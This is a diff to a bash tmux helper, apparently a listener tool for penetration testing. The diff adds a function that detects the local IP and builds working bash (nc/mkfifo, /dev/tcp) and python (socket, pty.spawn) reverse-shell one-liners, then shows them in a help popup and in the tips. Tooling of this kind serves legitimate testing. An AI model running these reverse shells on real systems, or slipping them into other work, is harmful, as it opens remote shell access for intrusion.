@@ -78,9 +78,14 @@ bind_keys() {
 │  F5        send recon commands to active shell                              │
 │  Ctrl-c    window 0: exit tmuxer · other windows: confirm before sending    │
 └────────────────────────────────────────────────────────────────────────────┘
-  Press any key to close
 EOF
-  tmux bind-key -n F1 display-popup -E -w 80 -h 13 "cat $help_file; read -rsk1 2>/dev/null || read -rs -n1"
+  {
+    printf 'Reverse shells:\n'
+    printf '  [bash]   %s\n' "$REVSHELL_BASH"
+    printf '  [python] %s\n' "$REVSHELL_PYTHON"
+    printf '\n  Press any key to close\n'
+  } >> "$help_file"
+  tmux bind-key -n F1 display-popup -E -w 220 -h 18 "cat $help_file; read -rsk1 2>/dev/null || read -rs -n1"
 
   # F5: recon commands
   if [[ -n "$INIT_CMDS" ]]; then
@@ -107,6 +112,16 @@ EOF
         tmux unbind-key -n F5 2>/dev/null' EXIT
 }
 
+build_revshells() {
+  local ip
+  ip=$(ip route get 1.1.1.1 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="src"){print $(i+1);exit}}')
+  ip=${ip:-$(hostname -I 2>/dev/null | awk '{print $1}')}
+  ip=${ip:-"<your-ip>"}
+
+  REVSHELL_BASH="H=$ip;P=$PORT;NC=\$(type -P nc||type -P ncat);if [ -n \"\$NC\" ];then F=\$(mktemp);rm \$F;mkfifo \$F;cat \$F|sh -i 2>&1|\$NC \$H \$P >\$F;else bash -i >/dev/tcp/\$H/\$P 0>&1 2>&1;fi"
+  REVSHELL_PYTHON="H=$ip;P=$PORT;PY=\$(type -P python3 2>/dev/null||type -P python 2>/dev/null);if [ -n \"\$PY\" ];then \$PY -c \"import socket,os,pty;s=socket.socket();s.connect(('\$H',\$P));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn('/bin/bash')\";else NC=\$(type -P nc||type -P ncat);F=\$(mktemp);rm \$F;mkfifo \$F;cat \$F|sh -i 2>&1|\$NC \$H \$P >\$F;fi"
+}
+
 print_tips() {
   cat <<'EOF'
 ┌─ tmux tips ────────────────────────────────────────────────────────────────┐
@@ -120,6 +135,9 @@ print_tips() {
 │  Ctrl-c    window 0: exit tmuxer · other windows: confirm before sending    │
 └────────────────────────────────────────────────────────────────────────────┘
 EOF
+  printf 'Reverse shells:\n'
+  printf '  [bash]   %s\n' "$REVSHELL_BASH"
+  printf '  [python] %s\n' "$REVSHELL_PYTHON"
 }
 
 check_port() {
@@ -190,6 +208,7 @@ start_listener() {
 
   enforce_tmux
   apply_tmux_settings
+  build_revshells
   bind_keys
   print_tips
   check_port
